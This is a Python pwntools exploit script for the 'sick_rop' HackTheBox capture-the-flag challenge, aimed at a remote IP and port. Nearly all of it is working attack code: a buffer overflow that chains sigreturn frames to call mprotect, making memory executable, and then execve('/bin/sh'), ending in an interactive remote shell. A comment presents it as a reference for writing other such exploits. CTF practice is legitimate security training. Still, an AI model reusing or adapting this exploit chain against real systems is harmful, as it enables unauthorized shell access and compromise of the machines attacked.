#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 46.101.23.188 --port 30172 ./sick_rop
from pwn import *

"""
This is exploit to "sick_rop", HTB chall, but can use as reference to write other JOP
"""

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./sick_rop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '46.101.23.188'
port = int(args.PORT or 30172)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

## Padding
pad = 40
junk = "\x90" * pad

vuln_addr = 0x40102e
syscall_ret = 0x401014 # syscall; ret
base_addr = 0x401000
mprotect_sys = 0xa
mprotect_size = 0x1000

execve_sys = 0x3b

io = start()

frame = SigreturnFrame(kernel="amd64")
frame.rax = mprotect_sys
frame.rdi = base_addr
frame.rsi = mprotect_size
frame.rdx = 7 # (rwx)
frame.rsp = 0x4010d8 # symtab pointer to 'vuln'
frame.rip = syscall_ret

buf = ""
buf += junk
buf += p64(vuln_addr)
buf += p64(syscall_ret)
buf += str(frame) # .encode()

io.send(buf)
io.recv(1024)

io.send("\x90" * 0xf) # eax = 0xf before syscall
io.recv(1024)

frame = SigreturnFrame(kernel="amd64")
frame.rax = execve_sys
frame.rdi = 0x4011e8 # address to /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = syscall_ret

buf = ""
buf += junk
buf += p64(vuln_addr)
buf += p64(syscall_ret)
buf += str(frame) # .encode()
buf += '/bin/sh'
buf += '\x00'

io.send(buf)
io.recv(1024)
io.send("\x90" * 0xf)
io.recv(1024)

io.interactive()

